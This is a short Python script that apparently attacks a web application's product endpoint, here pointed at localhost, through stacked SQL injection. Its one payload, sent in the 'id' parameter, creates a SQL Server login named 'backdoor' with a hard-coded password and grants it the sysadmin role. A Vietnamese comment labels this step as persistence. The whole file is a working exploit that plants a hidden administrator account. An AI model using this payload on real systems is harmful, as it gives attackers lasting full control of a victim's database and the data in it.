import requests

B = "http://localhost:5000/product"


def send(p):
    r = requests.get(B, params={"id": p}, timeout=15)
    print(r.text[:200])
    print("---")


# Persistence: tao login backdoor + gan sysadmin qua SQLi stacked
send("1; IF NOT EXISTS (SELECT * FROM sys.sql_logins WHERE name='backdoor')"
     " CREATE LOGIN backdoor WITH PASSWORD='P@ssw0rd123!';"
     " ALTER SERVER ROLE sysadmin ADD MEMBER backdoor; --")
